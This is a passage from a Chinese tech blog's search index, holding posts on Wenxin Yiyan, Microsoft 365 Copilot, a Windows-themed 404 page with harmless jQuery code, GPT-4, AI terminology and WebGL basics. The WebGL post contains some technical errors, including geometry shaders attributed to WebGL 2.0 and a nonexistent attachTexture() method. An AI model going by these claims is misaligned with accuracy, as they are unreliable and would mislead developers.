多模态生成：生成图片、音频能力，文心一言开箱即可使用。而视频生成成本较高，现阶段文心一言目前尚未对所有用户开放，不过未来会逐步接入。 OpenAI在北京时间3月15日凌晨举办的发布会中有这样一个场景：OpenAI联合创始人兼总裁Greg Brockman在草稿本上用纸笔画出一张非常粗糙的草图，拍照并上传，GPT-4仅用时10秒左右，就直接生成了网站代码。在发布会的演示中，GPT-4不仅是能分析汇总图文图标，甚至还能读懂梗图，指出梗在哪里、解释为啥好笑。但令人遗憾的是，GPT-4的图片输入生成输出文本能力并未向公众开放。 对比 Bing Chat 和 ChatGPT 相比 ChatGPT 和 Bing Chat，文心一言最大的不同点在于 多模态生成，即可以通过语言生成海报、语音甚至视频内容。发布会演示中，李彦宏展示了使用文心一言生成活动海报、方言语音，并根据提问内容生成与活动相关的视频。 ChatGPT 的信息库停留在 2021 年 9 月，在关于 2023 年初上演的 《三体》 电视剧版演员的问题中，ChatGPT 表示 《三体》 电视剧暂未开拍，而 Bing Chat 则在豆瓣中找到了答案。 在商业文案创作方面，三者均可以给出它们的看法，ChatGPT 还贴心地附上了英文名，方便我们步入国际市场。 发布会中提到的鸡兔同笼问题也没有难倒 Bing Chat 和 ChatGPT，二者均能准确地做出解答。 李彦宏多次强调百度在中文语言的处理上，处于独一无二的位置。例如让 ChatGPT 根据洛阳纸贵这四个字创作一首藏头诗，其创作的诗并不是藏头诗的格式。目前文心一言虽然也支持英文问答、代码场景，但实力有限，后期会投入数据训练。 另外，百度还将文心一言搭载到 Apollo 智舱系列产品，提升智能汽车的人车交互体验，与小度进行集成、让小度更加聪明和善解人意。 使用 3 月 16 日起，首批用户即可通过邀请测试码，在文心一言官网体验产品，后续将陆续开放给更多用户。https://yiyan.baidu.com/ 企业客户则可以在百度智能云平台进行预约，使用百度智能云开放的「文心一言」 API 接口。https://cloud.baidu.com/survey_summit/wenxin.html 获得通过后，百度官方会向你的邮箱发送通过邮件。 ","link":"https://zkrisj.github.io/post/zhong-wen-ban-chatgpt-wen-xin-yi-yan/"},{"title":"Microsoft 365 Copilot - 将 GPT-4 融入 Office","content":"介绍 除了大力投资 Open AI ，微软还亲自下场大搞 AI 。3 月 10 日，微软开源了 Visual ChatGPT，这个软件可以连接 ChatGPT 和一系列视觉模型，以实现在 ChatGPT 的聊天过程中发送和接收图像。 昨天，微软又宣布推出 Microsoft 365 Copilot，将大型语言模型 (LLM)（包括 Open AI 的 GPT-4）与 Microsoft Graph 和 Microsoft 365 应用中的数据相结合，将你的文字变成强大的生产力工具。 GitHub 数据 显示，Copilot 有望释放每个人的生产力。在使用 GitHub Copilot 的开发人员中，88% 的人表示他们的工作效率更高，74% 的人表示他们可以专注于更令人满意的工作，77% 的人表示这有助于他们花更少的时间搜索信息或示例。 Copilot in Word - 新建一个 New Word 就像打开一个 New World Copilot in Word 可以与用户一起写作、编辑、总结和创作。只需一个简短的提示，Copilot in Word 就能为用户创建一个初稿，并根据需要从整个组织获取信息。Copilot 可以将内容添加到现有的文件中，总结文本，改写部分或整个文件，使其更加简明。用户甚至可以得到建议的语气：从专业到热情，从随意到感谢，以帮助用户达成正确的音调。Copilot 还可以帮助用户改进写作，建议加强论点或消除不一致的部分，如： 根据一个文件和一个电子表格的数据，起草一份两页的项目建议书。 改变文件的语气，使其更加自然随意。 根据这个粗略的大纲，创建一个一页的草稿。 Copilot in Excel - Excel 中轻松完成一份 Excellent 的数据汇报 Copilot in Excel 与用户一起工作时，可以帮助分析和探索用户的数据。用自然语言向 Copilot 提出关于用户的数据集的问题，而不仅仅是简单的公式。它将揭示相关性，提出假设方案，并根据用户的问题建议新的公式：根据用户的问题生成模型，帮助用户探索用户的数据，而无需修改它。识别趋势，创建强大的可视化图表，或要求提供建议以推动不同的结果。如： 按类型和渠道给出销售的细分，插入一个表格。 预测一个变量变化的影响，并生成一个图表以帮助可视化。 模拟变量增长率的变化将如何影响我的毛利率。 Copilot in PowerPoint - 真正成熟的 PowerPoint 真的能帮你做 PPT PowerPoint 中的 Copilot 能够将现有的书面文件转换为包含演讲者备注和来源的幻灯片，或根据简单的提示或提纲开始新的演示文稿。你可以压缩冗长的演示文稿，调整布局，重新格式化文本，并精确控制动画的时间。如： 在Word文档的基础上创建一个五页幻灯片的演示文稿，并包括相关的图片资料。 将这个演示文稿合并成一个三张幻灯片的摘要。 将这三条摘要重新编排成三列，每列有一张图片。 Copilot in Outlook - 不仅仅只是收发邮件，Outlook 化身你的私人助理 Outlook 中的 Copilot 能够让你总结涉及多人的长篇邮件讨论，以了解已经讨论的内容、不同的观点以及尚未回答的问题。你还可以使用提示回复邮件，并将笔记转化为专业的邮件信息—从其他电子邮件或用户已经从整个 Microsoft 365 中获得的内容中提取。使用切换器来调整用户的笔记的语气或长度，如： 总结一下我上周外出时错过的邮件，标记任何重要的项目。 起草一份回复，感谢他们，并询问他们第二和第三点的更多细节；缩短这份草稿，使语气专业。 邀请大家参加下周四中午关于新产品发布的 &quot;午餐和学习&quot; 活动，并提到会提供午餐。 Copilot in Teams - 会议信息不怕遗漏，聚焦要务有 Teams 帮你自动搞定 Teams 中的 Copilot 能够帮助你运行高效的会议，快速掌握会议内容，组织关键讨论点，并总结行动计划。你甚至可以根据聊天记录创建会议议程，并确定正确的人员进行跟进，以及安排下一次签到，如： 总结一下我在会议中错过的内容。到目前为止提出了哪些观点？我们在这个话题上哪里有分歧？ 为正在讨论的话题建立一个正反两方面的表格。在做决定之前，我们还应该考虑什么？ 作出了哪些决定，有哪些建议的下一步行动？ Business Chat - 通过聊天的方式随时获得你所需的常用工作信息 Business Chat 是一种新的体验，可以跨越用户所有的数据和应用程序，使用 Microsoft Graph 技术，将你的文档、演示文稿、电子邮件、日历、笔记和联系人的数据汇集在一起。如下述场景： 总结一下昨晚发生的关于客户产品升级的聊天、邮件和文件。 项目的下一个里程碑是什么。有没有发现任何风险？帮我头脑风暴一下，列出一些潜在的缓解措施。 按照文件名A的风格写一份新的计划概述，纳入文件名B中的计划时间表，并与某人的电子邮件中的项目清单相结合。 你可以向它提供自然语言提示，例如 “告诉我的团队我们如何更新产品策略”，它会根据早上的会议、电子邮件和聊天线程生成状态更新。 总结 本月早些时候，微软宣布 Dynamics 365 Copilot 是全球首款同时用于 CRM 和 ERP 的 AI Copilot，旨在将下一代 AI 引入各行各业。现在，Copilot 将用于所有 Microsoft 生产力应用程序——Word、Excel、PowerPoint、Outlook、Teams、Microsoft Viva、Power Platform 等。定价和许可的具体细节将很快公布。Microsoft 365 Copilot 已经在一小部分客户中进行了测试，以获得在扩展时改进这些模型所需的关键反馈。微软目前正在与 20 家客户一起测试 Microsoft 365 Copilot，其中 8 家来自世界 500 强企业。在接下来的几个月中，这些预览将扩展到更多的客户，并将为 IT 管理员分享更多新的控制措施，以便他们可以自信地计划在整个组织中启用 Copilot。 ","link":"https://zkrisj.github.io/post/microsoft-365-copilot-jiang-gpt-4-rong-ru-office/"},{"title":"一个  Windows 主题的 404 页面","content":"介绍 Browser95-404 是一个 Windows 95 主题的 404 页面。页面显示为 Windows 95 的桌面，可以点击桌面上的图标进行一些交互，效果如下： 交互 桌面上随机位置有一个 404 错误弹窗，可以自由拖动。 点击 &quot;确定&quot; 或 &quot;X&quot; 关闭按钮会在随机位置产生另一个弹窗。 &quot;?&quot; 按钮是一个指向 baidu.com 的假链接，可以用其他网址代替。 “我的电脑” 打开一个假的上传对话框（将接受但不处理任何文件）。 “回收站” 重新加载当前页面，从而清除和初始化桌面。 “打印机” 提供该页面的 PDF 文件，因此您可以与所有朋友分享您的错误窗口。 “开始” 是一个指向 baidu.com 的假链接，你可以重定向到你的应用的主页面。 “时钟” 显示实际时间。 Win10 Windows 95 主题太古老了，我把它修改成了 Win10 主题样式。 页面结构 &lt;body style=&quot;background: #01A3F6; height: 100%; overflow: hidden;&quot;&gt; &lt;div class=&quot;win&quot;&gt; &lt;div id=&quot;desktop&quot;&gt; &lt;div class=&quot;desktopIcon&quot; id=&quot;mycomputer&quot; onclick=&quot;openDialog()&quot;&gt; &lt;img src=&quot;data:image/x-icon;base64,&quot; /&gt; &lt;div class=&quot;iconText&quot;&gt;此电脑&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;desktopIcon&quot; id=&quot;trash&quot; onclick=&quot;location.reload()&quot;&gt; &lt;img src=&quot;data:image/x-icon;base64,&quot; /&gt; &lt;div class=&quot;iconText&quot;&gt;回收站&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;desktopIcon&quot; id=&quot;print&quot; onclick=&quot;window.print()&quot;&gt; &lt;img src=&quot;data:image/x-icon;base64,&quot; /&gt; &lt;div class=&quot;iconText&quot;&gt;打印机&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;taskbar&quot;&gt; &lt;a href=&quot;https://juejin.cn&quot; id=&quot;start&quot;&gt; &lt;/a&gt; &lt;div id=&quot;notifications&quot;&gt; &lt;div id=&quot;clock&quot;&gt;&lt;/div&gt; &lt;div class=&quot;division&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; 最外层是 .win 容器元素。 .win 容器分为 #desktop 桌面和 #taskbar 任务栏两部分。 桌面有 #mycomputer、#trash 和 #print 三个图标。 任务栏有 #start 开始按钮、#clock 时间区域和 #division 分隔符。 JS 代码 页面使用了 jQuery UI 拖拽组件，需要使用 script 标签引入它们： &lt;script src=&quot;https://unpkg.com/jquery@3.6.4/dist/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://unpkg.com/jquery-ui@1.13.2/dist/jquery-ui.min.js&quot;&gt;&lt;/script&gt; 初始化时间和鼠标悬停时的提示文本（日期和星期）。 function startTime() { const date = new Date(); $('#clock').text(date.toLocaleTimeString(0, { hour12: false })).attr('title', date.toLocaleString(0, { dateStyle: 'full' })); setTimeout(function() { startTime() }, 500); } 创建错误窗口方法，并处理它们的拖拽操作。 let errNum = 404; let posZ = 0; function spawnWindow() { const posx = (Math.random() * ($(document).width() - 292)).toFixed(); const posy = (Math.random() * ($(document).height() - 125)).toFixed(); posZ += 1; // 生成新窗口 $('body').append(`&lt;div class=&quot;box draggable&quot; style=&quot;top: ${posy}px; left: ${posx}px; z-index: ${posZ}&quot;&gt; &lt;div class=&quot;title&quot; id=&quot;header&quot;&gt; &lt;img src=&quot;data:image/png;base64,&quot; width=&quot;16&quot; height=&quot;16&quot; class=&quot;title&quot; /&gt; &lt;p class=&quot;title&quot;&gt;&amp;nbsp;Error ${errNum}&lt;/p&gt; &lt;button onclick=&quot;spawnWindow()&quot;&gt;X&lt;/button&gt; &lt;a href=&quot;https://juejin.cn&quot;&gt; &lt;button&gt;?&lt;/button&gt; &lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;body&quot;&gt; &lt;img style=&quot;float: left;margin-left: 10px;&quot; src=&quot;data:image/x-icon;base64,&quot;&gt; &lt;p style=&quot;float: right;margin-top: 5px;&quot;&gt;&lt;b&gt;Message&lt;/b&gt;: Unable to locate your page.&lt;/p&gt; &lt;button style=&quot;top: 15px; width: 60px;&quot; class=&quot;button&quot; onclick=&quot;spawnWindow()&quot;&gt;OK&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; `).find('div.draggable').draggable({ scroll: false }); // 将聚焦窗口置于最前面 $(&quot;.draggable&quot;).on('mousedown', function(event) { if ($(this).css(&quot;z-index&quot;) &lt; posZ) { posZ += 1; $(this).css(`z-index`, posZ); } }); errNum += 1; } 绑定 “我的电脑” 图标点击事件，打开虚拟文件选择对话框。 function openDialog() { const input = document.createElement('input'); input.type = 'file'; input.click(); } 将函数绑定到文档的就绪事件（当文档完成加载时）。 $(document).ready(function() { startTime(); spawnWindow(); }); 码上掘金 仓库地址 Browser95-404：https://github.com/Daenges/Browser95-404 ","link":"https://zkrisj.github.io/post/yi-ge-windows-zhu-ti-de-404-ye-mian/"},{"title":"GPT-4 发布了，赶紧申请 API 候补名单","content":"介绍 GPT-4（Generative Pre-trained Transformer 4）是 OpenAI 开发的一种大型语言模型。它在 GPT-3 的基础上进一步优化和扩展，提供了更加精确和全面的语言理解与生成能力。以下是官网介绍： GPT-4 是一个多模态大型语言模型（支持接受图像和文本输入，以文本形式输出），也是 OpenAI 努力扩展深度学习的最新里程碑。虽然 GPT-4 对于许多现实场景的处理比人类差，但它在各种体现专业和学术能力的 benchmark 上，已表现出和人类相当的水平。 例如，GPT-4 通过了模拟律师考试，其分数在应试者的前 10% 左右；相比之下，GPT-3.5 的得分却在倒数 10% 左右。OpenAI 表示，他们花了 6 个月的时间来使用对抗性测试程序，以及通过 ChatGPT 的经验教训迭代调整 GPT-4，从而在真实性和可控性等方面取得了有史以来最好的结果（尽管远非完美）。 我们还开源了 OpenAI Evals，这是我们用于自动评估 AI 模型性能的框架，允许任何人报告我们模型中的缺点，以帮助指导进一步改进。 对比 在随意的谈话中，GPT-3.5 和 GPT-4 之间的区别可能很微妙。当任务的复杂性达到足够的阈值时，差异就会出现——GPT-4 比 GPT-3.5 更可靠、更有创意，并且能够处理更细微的指令。 OpenAI 还将机器学习模型的传统 benchmark 用于评估 GPT-4。结果显示，GPT-4 已经远远超过现有的大型语言模型，以及大多数最先进的 SOTA（state-of-the-art）模型。benchmark 数据如下： 在 MMLU benchmark 中（一个基准数据集，包括来自于 STEM、人文、社科等 57 个学科的选择题，它用于测试 LLM 的世界知识和问题解答的能力），GPT-4 处理中文的准确度大约是 80%，已经优于其他 LLM 的英文表现，比如 GPT-3.5、Chinchilla、PALM。 示例 创造力：GPT-4 比以往任何时候都更具创造性和协作性。它可以生成、编辑并与用户一起迭代创意和技术写作任务，例如创作歌曲、编写剧本或学习用户的写作风格。 输入 用一个句子解释灰姑娘的情节，其中每个单词必须以字母表中从 A 到 Z 的下一个字母开头，不重复任何字母。 输出 A beautiful Cinderella, dwelling eagerly, finally gains happiness; inspiring jealous kin, love magically nurtures opulent prince; quietly rescues, slipper triumphs, uniting very wondrously, xenial youth zealously.（翻译：美丽的灰姑娘，热切的栖居，终于获得幸福；激起嫉妒的亲人，爱情神奇地孕育出富贵的王子；悄悄拯救，拖鞋胜利，团结无比，热心青年。） 视觉输入：GPT-4 可以接受图像作为输入并生成说明、分类和分析。 输入 我可以用这些原料做什么？ 输出 你可以用这些原料做很多选择！一些可能性包括：- 煎饼或华夫饼 - 可丽饼 - 法式吐司 - 煎蛋卷或菜肉馅煎蛋饼 - 乳蛋饼 - 奶油冻或布丁 - 蛋糕或纸杯蛋糕 - 松饼或面包 - 饼干。这些只是几个例子，但可能性是无穷无尽的！ 输入 这张图有什么好笑的？并对图片中的每部分进行描述。 输出 图片显示了一个 &quot;Lightning Cable&quot; 适配器的包装，总共包含三个部分。 图片 1：一部智能手机，其充电端口插着一个 VGA 接口（大的蓝色 15 针接口，通常用于电脑显示器）。 图片 2：&quot;Lightning Cable&quot; 适配器的包装上有一张 VGA 接口的图片。 图片 3：VGA 连接器的特写，末端是一个小的 Lightning 连接器（用于为 iPhone 和其他苹果设备充电）。 这张图片中的幽默来自将过时的大型 VGA 连接器插入小型现代智能手机充电端口的荒谬做法。 更长的上下文：GPT-4 能够处理超过 25,000 个单词的文本，允许使用长格式内容创建、扩展对话以及文档搜索和分析等用例。 输入 [文章来自：https://en.wikipedia.org/wiki/Rihanna] 描述她在超级碗比赛中的表现以及它的特别之处（文章很长，要比 GPT3.5 能处理的文本长出一倍，下面是截图）。 输出 出于多种原因，蕾哈娜 (Rihanna) 的超级碗 LVII 中场秀表演很特别。首先，这是她五年多来的第一次现场表演，也是她第一次登上超级碗中场秀的头条新闻。此外，她还创造了历史，成为第一个在怀孕期间在超级碗上表演的人。该节目本身广受好评，许多人称赞她充满活力的表演和令人印象深刻的歌声。它还获得了巨大的收视率，成为历史上收视率第二高的中场秀。 高级用法 上面的示例看起来很简单？OpenAI 紧接着展示了高级用法 —— 读论文。简单来说就是给 GPT-4 提供论文的图片格式文件，让它阅读并总结出要点。效果如下： 回答图片中包含的提问内容等操作： 甚至回答图片中对应题号的问题： GPT-4 局限性 GPT-4 跟 GPT-3.5 类似，对训练数据中断后（2021 年 9 月）所发生的事情不太了解，也会犯一些在我们看来很简单的推理性错误，给用户提供不合理的建议，以及在生成的代码中引入安全漏洞。 在内部的对抗性真实性评估中，GPT-4 的得分比最新的 GPT-3.5 高 40%： 也就是说，即便 GPT4 生成的答案更准确，但也只是比 GPT-3.5 更加可信了 40% 而已！ 在使用语言模型输出时，尤其是在高风险上下文中，应非常小心，使用与特定用例需求匹配的精确协议（如人工审查、附加上下文基础或完全避免高风险使用）。 对于这些潜在性的危险因素，团队也聘请了来自多个不同行业的专家对模型进行了优化调整，但是其具体效果，还需要等后面场景应用较为广泛后，才能得出结论。 试用 如果你有 ChatGPT Plus 订阅会员，则可以直接在 chat.openai.com 上获得 GPT-4 访问权限，无需等待。不过有一定限制，在 4 小时内，最多只能发布 100 条信息。 获得访问权限后，用户当前还是只能向 GPT-4 模型发出纯文本请求，图像输入仍然只是研究预览阶段，得等一些时间才对外开放。 申请 GPT-4 API OpenAI 已面向开发者开放 GPT-4 API 的申请通道，想使用的话，可以先提交申请，进入 waitlist 中等待通过。 申请通道：https://openai.com/waitlist/gpt-4-api 如果申请成功，会收到一封官方的邮件： ","link":"https://zkrisj.github.io/post/gpt-4-fa-bu-liao-gan-jin-shen-qing-api-hou-bu-ming-dan/"},{"title":"AI、机器学习和深度学习有何区别？","content":"介绍 人工智能（artificial intelligence，缩写为 AI）指可模仿人类智能来执行任务，并基于收集的信息对自身进行迭代式改进的系统和机器。AI 具有多种形式。例如： 聊天机器人使用 AI 更快速高效地理解客户问题并提供更有效的回答 智能助手使用 AI 来解析大型自由文本数据集中的关键信息，从而改善调度 推荐引擎可以根据用户的观看习惯自动推荐电视节目 如今人工智能已变成了一个无所不包的术语，很多用来执行在过去需要人工输入的复杂任务的应用（例如与客户在线沟通或下棋）都可以被称作人工智能。在现实中，人工智能也经常与它的子领域互换使用，例如机器学习和深度学习。 AI、机器学习和深度学习有何区别？ 尽管 AI、机器学习和深度学习相互关联，但它们之间存在本质区别： 人工智能 (AI) 人工智能可让计算机、机器和机器人模仿人，像人一样制定决策、识别对象、解决问题和理解语言。 机器学习 (ML) 机器学习是 AI 的一个子集，它专注于构建可自主学习（无需人为干预）数据，从而持续提高准确性的应用。经过训练，机器学习算法可识别数据模式，做出更明智的决策和预测，但这一般需要用户参与。机器学习侧重于构建能够基于自身使用的数据进行学习或改进性能的系统。换句话说，所有的机器学习都是 AI，但不是所有的 AI 都是机器学习。 深度学习 深度学习是机器学习的一个子集，指人工神经网络（由算法建模而成，能够像人的大脑一样工作）学习大量数据，可帮助计算机解决更复杂的问题。从下图可以看到，随着数据量的增大，深度学习的性能会越来越好，而传统机器学习方法性能表现却趋于平缓；但传统的机器学习算法在数据量较小的情况下，比深度学习有着更好的表现。 深度学习与神经网络有何区别？ 神经网络由一系列算法按照人类大脑的工作方式松散建模而成，它使用大量数据进行训练来对神经网络的神经进行配置。简单来说，深度学习由神经网络层驱动，深度学习就是具有多个神经层的神经网络的另一种说法。 简而言之，AI 是一个广泛的概念，机器学习是 AI 的一个分支，深度学习是机器学习的一个特定分支。深度学习是目前最先进的机器学习技术之一，具有很强的特征提取和模式识别能力，对于处理大规模、高维度的数据具有很大的优势。 AI 的应用 AI（人工智能）的应用非常广泛，在各行各业都有应用，以下是一些常见的应用场景： 自然语言处理(NLP)：如语音识别、机器翻译、情感分析等。 计算机视觉(CV)：如图像识别、目标检测、人脸识别、自动导航、自动驾驶等。 智能家居：例如智能家电、智能安防、智能环境控制等。 机器学习：如预测模型、分类、聚类、回归、决策树等。 智能推荐：如商品推荐、新闻推荐、音乐推荐、影视推荐等。 自动化流程：如机器人流程自动化、自动生产线、无人仓库等。 数据分析：如数据挖掘、预测分析、人工智能报表等。 联机广告和营销：如广告优化、自动竞价、展示/曝光分析、人群分析等。 人工智能助手：如智能客服、语音助手、聊天机器人、虚拟秘书等。 健康医疗：如医疗影像分析、精准医疗诊疗等。 金融：如风控评估、欺诈检测、信用评估等。 除了以上所述之外，人工智能还有许多其他应用，特别是在工业、交通、城市管理、社交网络等领域有广泛的应用。 AI 在企业中的应用 人工智能技术可以自动执行以往需要手动完成的流程或任务，提高企业绩效和生产率，还可以超越人力极限，充分发挥数据的价值，为企业创造巨大的商业效益。 AI 可以为大多数职能、业务和行业创造价值。其中包括通用和行业特定的应用，例如: 智能客服：企业可以使用AI构建聊天机器人或虚拟助手来实现智能客服，从而能够更加高效地对客户提供服务和支持。 数据分析：AI 可以对大量的数据进行分析和预测，帮助企业做出更加准确的决策，例如销售预测、用户行为分析、市场趋势分析等。 自动化流程：AI 可以帮助企业实现自动化流程，从而提高生产效率、降低成本，例如生产线自动化、财务管理自动化等。 安全保障：AI 可以帮助企业进行网络安全保障，自动多层次防范，检测和排查潜在的数据漏洞等安全性问题。 营销和广告：AI 可以帮助企业进行营销和广告推广，例如根据用户行为和需求，自动化推荐商品、跟踪顾客满意度等。 人才招聘：AI 可以辅助企业加速招聘过程并提高招聘效率，例如自动筛选简历、预测招聘成功率等。 智慧医疗：使用图像识别来分析 X 射线图像中的癌症迹象。 物流管理：企业可以利用 AI 技术优化物流路线和配送计划，提高配送效率和准确性。 人力资源管理：企业可以利用AI技术辅助招聘、培训、绩效评估等人力资源管理工作，提高效率和准确性。 生产管理：企业可以利用AI技术优化生产流程，提高生产效率和产品质量。例如，使用机器学习算法优化生产计划，减少生产成本。 金融服务：银行和保险公司可以利用 AI 技术辅助风险评估和欺诈检测，提高服务质量和风险控制能力。 自然语言处理：企业可以利用自然语言处理技术分析和处理大量的文本数据，例如社交媒体评论、客户反馈等，从中获取有价值的信息。 这些应用让 AI 在企业中有广泛的应用，加快了企业数字化转型进程，提高了企业生产效率，降低了企业成本。 ","link":"https://zkrisj.github.io/post/aiji-qi-xue-xi-he-shen-du-xue-xi-you-he-qu-bie/"},{"title":"WebGL 工作原理","content":"介绍 WebGL 是一种基于 Web 的图形渲染技术，它允许在浏览器中使用 JavaScript 和 OpenGL ES API 创建 3D 和 2D 图形，而无需插件或其他软件。 通过 WebGL，开发人员可以使用 GPU 加速来实现更高效的图形渲染，从而提供更流畅、更快速的用户体验。WebGL 还支持与其他 Web 技术（如 HTML、CSS 和 JavaScript）的集成，使其成为创建交互式 Web 应用程序和游戏的强大工具。 它的发展经历了以下几个阶段： WebGL 1.0：2011 年发布，提供了基本的 3D 渲染功能，但受到硬件和驱动支持的限制。 WebGL 2.0：2017 年发布，增加了更多的特性和扩展，如多重渲染目标、几何着色器等，提升了渲染效率和灵活性。 WebGL Next：正在开发中，旨在进一步提升 WebGL 的性能和功能，包括更好的异步编程模型、更低的延迟、更高的帧率等。 GLSL GLSL - OpenGL Shading Language 也称作 GLslang，是一个以 C 语言为基础的高阶着色语言，是一种类似于 C 语言的编程语言，用于描述 GPU 中的计算流程和数据处理，GLSL 直接由图形管道执行。OpenGL ARB 在 OpenGL 2.0 核心中正式纳入 GLSL。 GLSL 不同于 JavaScript，它是强类型语言（不可以隐式的转换类型或直接转型），并且内置很多数学公式用于计算向量和矩阵。 数据类型 GLSL 语言规格定义了 22 个基本数据类型，有些用法与 C 相同，其它的是绘图处理器特有的。 void – 用于没有返回值的函数。 float：表示单精度浮点数，通常用于表示坐标、颜色等数值。 vec2、vec3、vec4：表示 2、3、4 个浮点数的向量，由于 WebGL 是一个基于向量的 API，因此很常用，通常用于表示坐标、颜色等向量值。 mat2、mat3、mat4：表示 2x2、3x3、4x4 矩阵，通常用于表示变换矩阵。 int、ivec2、ivec3、ivec4：表示整数或整数向量。 bool、bvec2、bvec3、bvec4：表示布尔值或布尔向量。 sampler2D、samplerCube：表示 2D 纹理和 3D 纹理，用于从纹理中获取颜色值。 函数和控制结构 类似于 C 语言，GLSL 支持循环和分支，包括 if、else、if/else、for、do-while、break、continue 等。 支持使用者定义函式，且各种常用的函式也已内建。这也就让绘图卡制造商，能够在硬件层次上最佳化这些内建的函式。许多函式与 C 语言相同，如 exp() 以及 abs()，其它绘图编程特有的，如 smoothstep() 以及 texture2D()。 数据存储类型 GLSL 为着色器提供了三种不同作用的数据存储方式，用来处理着色器（shader）的输入和输出。 attribute：用于在顶点着色器中传递顶点数据。attribute 变量仅仅在顶点着色器中被声明，它的值被插值后传递到片段着色器中。在 WebGL 中，attribute 变量可以从缓冲区中读取数据，并把它传递到一个顶点着色器中。 varying：定义的变量用于在顶点着色器和片段着色器之间传递数据，在顶点着色器中定义，然后在片段着色器中使用。varying 变量是根据传递给片段着色器的屏幕像素位置差值计算出的。 uniform：用于在着色器程序中传递全局数据，在着色器程序中的所有着色器中都可以访问。uniform 变量的值不会随着顶点的变化而变化，并且必须使用 JavaScript 代码来更新 uniform 变量的值。例如，视图矩阵、投影矩阵、转换矩阵、光源信息等可以使用 uniform 变量传递到着色器程序中。 简单地说，attribute、varying 和 uniform 是 WebGL 中的三种不同的变量类型，它们分别用于传递顶点数据、在着色器程序中传递数据和传递全局状态信息。每种数据依作用不同可以被一种或者全部着色器访问（取决于数据存储类型），也可通过 Javascript 代码进行访问。 基本图形 在 WebGL 中，只有三种基本图形：点、线、三角形，所有的复杂的图形都是由点、线、三角形这三类基本图形所产生。 通过 gl.drawArray(mode, first, count) 这个 API 绘制基本图形，其中 mode 参数就是绘制的基本图形类型，具体的方式如下图所示： 坐标系统 HTML 的 2D 坐标表示中如左下图所示，webgl 的 2D 坐标如右下图所示。 如果我们要把 HTML 中的坐标转换为 webgl 的坐标，需要使用裁剪矩阵来做坐标的转换。 就像其他的 3D 坐标，Z 轴表示深度，正值表示屏幕里，负值表示屏幕外。 WebGL 的坐标被限制为 (-1,-1,-1)~(1,1,1)。 着色器（Shader） 着色器是一段运行在 GPU 上的程序，它可以根据顶点坐标、法向量、纹理等信息来计算出每个像素的颜色值，实现光照、纹理、网格和其他图形效果。WebGL 使用着色器来处理 3D 场景中的图元，包括点、线、三角形等。 WebGL 着色器使用 GLSL 编写。顶点着色器负责将顶点数据转换为 WebGL 中理解的格式，而片段着色器则负责对每个像素执行颜色计算，以实现最终的渲染效果。一个顶点着色器和一个片段着色器链接在一起放入一个着色程序（或者只叫程序）中，一个 WebGL 应用可以有多个着色程序。 顶点着色器的目的是设置 gl_Position 变量——这是一个特殊的、全局的、内置的 GLSL 变量，用于存储当前顶点的位置，每个顶点调用一次。 void main(void) { gl_Position = ftransform(); } 片段着色器的目的是设置变量 gl_FragColor 变量——也是一个特殊的、全局的、内置的 GLSL 变量，用于指定片元（像素）的颜色值，单个片段着色器被每个像素调用一次。 void main(void) { gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); } 使用着色器步骤： 创建着色器程序： 通过调用 WebGL 上下文的 createShader() 方法创建顶点着色器和片元着色器，并使用 WebGL 上下文的 createProgram() 方法创建着色器程序。使用 GLSL 编写顶点着色器和片元着色器的代码，并将代码存储到创建的着色器对象中。 绑定数据源： 将顶点数据绑定到顶点着色器，或将纹理数据绑定到片元着色器。在顶点着色器中，数据源可能包括顶点位置、纹理坐标和法向量等。在片段着色器中，数据源可能包括颜色、纹理像素等。 编译着色器： 与通常在 CPU 上执行的 JavaScript 代码不同，WebGL 着色器需要编译，因为在 WebGL 中，着色器是用 GLSL 语言编写的。编译过程将 GLSL 代码转换为 GPU 可以运行的机器代码，以便能够在 WebGL 中使用。这个过程包括语法分析，语义分析和代码生成。如果着色器代码存在错误，则编译过程将失败并产生错误信息，从而帮助开发者找到和修复代码中的问题。 绑定着色器： WebGL 支持同时使用多个着色器程序，因此需要指定当前使用的着色器程序。例如，如果需要在同一个渲染管线中使用不同的顶点着色器或片段着色器，需要在需要的时候切换绑定到不同的着色器。 链接着色器程序： 通过调用 WebGL 上下文的 attachShader() 和 linkProgram() 方法将顶点着色器和片元着色器关联到着色器程序中。 使用着色器程序： 在绘制图形时，通过调用 WebGL 上下文的 useProgram() 方法来激活着色器程序，并通过 uniform 变量将数据传递给着色器程序。 与其他对象结合使用 着色器程序可以与缓冲对象和纹理对象等其他 WebGL 元素进行结合使用，从而实现更加复杂的渲染效果，例如反射、折射、阴影等。 使用缓冲对象： 在着色器程序中，通过使用 attribute 变量来接收缓冲对象中的顶点数据。通过调用 WebGL 上下文的 bindBuffer() 方法将缓冲对象绑定到 GL_ARRAY_BUFFER 类型上，并使用 WebGL 上下文的 bufferData() 方法将顶点数据存储到缓冲对象中。然后，在绘制图形时，通过调用 WebGL 上下文的 drawArrays() 或 drawElements() 方法来使用缓冲对象中的数据。 数据流程图如下： 使用纹理对象： 传入纹理数据的流程其实和传入顶点数据的流程差不多，如下图所示： 在着色器程序中，通过使用 uniform 变量来接收纹理对象中的像素数据。通过调用 WebGL 上下文的 createTexture() 方法创建纹理对象，并使用 WebGL 上下文的 texImage2D() 方法将像素数据存储到纹理对象中。然后，通过调用 WebGL 上下文的 bindTexture() 方法将纹理对象绑定到 GL_TEXTURE_2D 类型上，并使用 glUniform1i() 方法将纹理对象的位置传递给着色器程序。最后，在片元着色器中，通过调用 texture2D() 函数来计算纹理坐标对应的像素颜色值。 数据流程图如下： 使用帧缓冲对象： 在着色器程序中，通过调用 WebGL 上下文的 createFramebuffer() 方法创建帧缓冲对象，并使用 WebGL 上下文的 bindFramebuffer() 方法将帧缓冲对象绑定到 GL_FRAMEBUFFER 类型上。然后，通过调用 WebGL 上下文的 attachTexture() 或 attachRenderbuffer() 方法将纹理对象或渲染缓冲对象附加到帧缓冲对象上。最后，在绘制图形时，通过调用 WebGL 上下文的 drawArrays() 或 drawElements() 方法将帧缓冲对象中的像素数据渲染到屏幕上。 往着色器中传递 uniform 类型的数据直接使用 WebGL 提供的 API 即可，而不需要额外的对象作为媒介。例如： 